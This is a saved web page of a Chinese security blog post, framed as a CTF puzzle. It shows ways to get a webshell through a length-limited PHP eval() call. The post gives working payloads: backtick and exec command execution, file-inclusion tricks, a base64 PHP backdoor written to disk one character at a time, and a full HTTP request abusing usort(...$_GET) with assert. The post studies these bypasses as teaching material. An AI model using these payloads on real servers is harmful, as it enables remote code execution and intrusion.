@@ -1,0 +1,342 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>eval长度限制绕过 &amp;&amp; PHP5.6新特性 | 离别歌</title>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/styles.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/style.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/jquery.min.js"></script>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/code.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/button.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;text=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;title=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;is_video=false&amp;description=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7&amp;body=Check out this article: https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;title=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;title=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;title=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;title=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PHP/bypass-eval-length-restrict.html&amp;name=eval%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%20%26%26%20PHP5.6%E6%96%B0%E7%89%B9%E6%80%A7&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">eval长度限制绕过 &amp;&amp; PHP5.6新特性</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2017年1月18日 22:25" itemprop="datePublished">
+                    2017 一月 18 22:25
+                </time>
+</div>
+<div class="article-tag">
+            阅读：5513
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PHP">PHP</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7">奇技淫巧</a>,
+                
+                <a class="tag-link" href="/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">命令执行漏洞</a>,
+                
+                <a class="tag-link" href="/tag/ctf">ctf</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>昨天晚上 @roker 在小密圈里问了一个问题，就是eval(xxx)，xxx长度限制为16个字符，而且不能用eval或assert，怎么执行命令。</p>
+<p>我把他的叙述写成代码，大概如下：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$param</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'param'</span><span class="p">];</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">17</span> <span class="o">&amp;&amp;</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$param</span><span class="p">,</span><span class="s1">'eval'</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nb">stripos</span><span class="p">(</span><span class="nv">$param</span><span class="p">,</span><span class="s1">'assert'</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">eval</span><span class="p">(</span><span class="nv">$param</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>那么这个代码怎么拿到webshell？</p>
+<h2 id="_1"><a class="toclink" href="#_1">命令执行的利用</a></h2>
+<p>这个是我得到最多的一种答案，大部分人都是利用命令执行来绕过限制，最短的是：</p>
+<div class="codehilite"><pre><span></span>param=`$_GET[1]`;&amp;1=bash
+</pre></div>
+<p>稍长一点的可以用exec：</p>
+<div class="codehilite"><pre><span></span>param=exec($_GET[1]);
+</pre></div>
+<p>这个方法我就不多说了，送分题。</p>
+<h2 id="_2"><a class="toclink" href="#_2">远程文件包含的利用</a></h2>
+<p>有的同学提到了远程文件，但正常文件包含<code>include $_GET[1];</code>，这个刚好17个字符，超了一位。</p>
+<p>不过，其实<code>include$_GET[1];</code>也是可以运行的，中间的空格可以不要。</p>
+<p>这也是一个思路，但限制就是需要开启远程文件包含，但这个选项默认是关闭的。</p>
+<h2 id="_3"><a class="toclink" href="#_3">本地文件包含的利用</a></h2>
+<p>那么，文件包含真的不行么？</p>
+<p>有一种思路，利用file_put_contents可以将字符一个个地写入一个文件中，大概请求如下：</p>
+<div class="codehilite"><pre><span></span>param=$_GET[a](N,a,8);&amp;a=file_put_contents
+</pre></div>
+<p>file_put_contents的第一个参数是文件名，我传入N。PHP会认为N是一个常量，但我之前并没有定义这个常量，于是PHP就会把它转换成字符串'N'；第二个参数是要写入的数据，a也被转换成字符串'a'；第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。</p>
+<p>除了file_put_contents，error_log函数效果也类似。</p>
+<p>但这个方法有个问题，就是file_put_contents第二个参数如果是符号，就会导致PHP出错，比如<code>param=$_GET[a](N,&lt;,8);&amp;a=file_put_contents</code>。但如果要写webshell的话，“&lt;”等符号又是必不可少的。</p>
+<p>于是微博上 @买贴膜的 想出一个办法，每次向文件'N'中写入一个字母或数字，最后构成一个base64字符串，再包含的时候使用php://filter对base64进行解码即可。</p>
+<p>最后请求如下：</p>
+<div class="codehilite"><pre><span></span># 每次写入一个字符：PD9waHAgZXZhbCgkX1BPU1RbOV0pOw
+# 最后包含
+param=include$_GET[0];&amp;0=php://filter/read=convert.base64-decode/resource=N
+</pre></div>
+<p>成功getshell。</p>
+<h2 id="_4"><a class="toclink" href="#_4">本地日志包含</a></h2>
+<p>这是 @lem0n 师傅想到的一个方法，首先通过各种方法找到web日志，然后利用上面说的include的方式来包含之。</p>
+<div class="codehilite"><pre><span></span>param=include$_GET[a];&amp;a=/home/u244201241/.logs/php_error.log
+</pre></div>
+<p>如果找不到web日志，利用条件竞争的方法，包含tmp文件也可以，有心的同学可以试试。</p>
+<h2 id="_5"><a class="toclink" href="#_5">标准答案：利用变长参数特性展开数组</a></h2>
+<p>这是我出这个题目时想的标准答案，其实也是roker提出的那个问题的一种解决方法。</p>
+<p>变长参数是PHP5.6新引入的特性，文档在此： <a href="http://php.net/manual/zh/migration56.new-features.php"><a href="http://php.net/manual/zh/migration56.new-features.php">http://php.net/manual/zh/migration56.new-features.php</a></a></p>
+<p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p>
+<p>再结合我曾提到过的回调后门（ <a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html"><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></a> ），即可构造一个完美的利用，数据包如下：</p>
+<div class="codehilite"><pre><span></span><span class="nf">POST</span> <span class="nn">/test.php?1[]=test&amp;1[]=var_dump($_SERVER);&amp;2=assert</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:8081</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">22</span>
+
+param=usort(...$_GET);
+</pre></div>
+<p>效果图：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201701/77d21484750770.jpg"><img alt="14847507412871.jpg" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/thum-77d21484750770.jpg" title="点击查看原图"/></a></p>
+<p>大概过程就是，GET变量被展开成两个参数<code>['test', 'phpinfo();']</code>和<code>assert</code>，传入usort函数。usort函数的第二个参数是一个回调函数<code>assert</code>，其调用了第一个参数中的<code>phpinfo();</code>。修改<code>phpinfo();</code>为webshell即可。</p>
+<p>最后说一下，这个方法基本无视任何WAF，各个WAF需要关注了。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2525">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/228b4bff9e4402c33811269bf2e88db3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">A11riseforme</a>
+<time datetime="2017年2月3日 05:15" itemprop="datePublished">
+                            2017 二月 03 05:15
+                        </time>
+<a href="javascript:reply_to('2525', 'A11riseforme')">回复</a>
+</p>
+<p class="comment-meta">param=$_GET[a](N,a,8);&amp;a=file_put_contents，第三个参数是flag，当flag=8的时候内容会追加在文件末尾，而不是覆盖。<br>我想问下这个flag=8的时候是追加写文件是怎么知道的？我看网上的php手册上好像都没有提到这个，难道是一个一个试出来的？</br></p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2527">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com" target="_blank">phithon</a>
+<time datetime="2017年2月3日 16:09" itemprop="datePublished">
+                            2017 二月 03 16:09
+                        </time>
+<a href="javascript:reply_to('2527', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@A11riseforme php源码 ext/standard/file.h 定义的<br>```<br/>#define PHP_FILE_USE_INCLUDE_PATH 1<br/>#define PHP_FILE_IGNORE_NEW_LINES 2<br/>#define PHP_FILE_SKIP_EMPTY_LINES 4<br/>#define PHP_FILE_APPEND 8<br/>#define PHP_FILE_NO_DEFAULT_CONTEXT 16<br/>```<br/>PHP_FILE_APPEND是8</br></p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2531">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/228b4bff9e4402c33811269bf2e88db3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">A11riseforme</a>
+<time datetime="2017年2月6日 21:32" itemprop="datePublished">
+                            2017 二月 06 21:32
+                        </time>
+<a href="javascript:reply_to('2531', 'A11riseforme')">回复</a>
+</p>
+<p class="comment-meta">@phithon 多谢~</p>
+</div>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2519">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/f14545627760b466121491792fc0c9ca.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://adoncn.com/" target="_blank">跨境电商运营</a>
+<time datetime="2017年1月30日 21:39" itemprop="datePublished">
+                            2017 一月 30 21:39
+                        </time>
+<a href="javascript:reply_to('2519', '跨境电商运营')">回复</a>
+</p>
+<p class="comment-meta">非常不错。。。。。。。</p>
+</div>
+</div>
+<div class="row" id="comment-2515">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/b642b4217b34b1e8d3bd915fc65c4452.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">test</a>
+<time datetime="2017年1月23日 11:02" itemprop="datePublished">
+                            2017 一月 23 11:02
+                        </time>
+<a href="javascript:reply_to('2515', 'test')">回复</a>
+</p>
+<p class="comment-meta">想请教下，为什么用标准答案的方法时，get参数必须用数字才能正常执行，换成比如？a[]=test&amp;a[]=phpinfo();&amp;b=assert时就会失败，不知可否解答下</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2516">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2017年1月25日 18:27" itemprop="datePublished">
+                            2017 一月 25 18:27
+                        </time>
+<a href="javascript:reply_to('2516', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@test：只有数字索引数组才能作为变长参数数组。</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2513">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/98b1c939848d27c2d882b02afb28ca45.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.baidu.com" target="_blank">100</a>
+<time datetime="2017年1月19日 10:45" itemprop="datePublished">
+                            2017 一月 19 10:45
+                        </time>
+<a href="javascript:reply_to('2513', '100')">回复</a>
+</p>
+<p class="comment-meta">神标准答案</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="35d174baadc3a8d6ef0c62419138c19b4439e76d"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/35d174baadc3a8d6ef0c62419138c19b4439e76d"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="404">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="cl81jQGU2xtUAN0ZMe7uHhyoecnuWHyrKFtx7kS9tknjAsoeAvBegVAtngQCFbnB"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./eval长度限制绕过 &amp;amp;&amp;amp; PHP5.6新特性  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
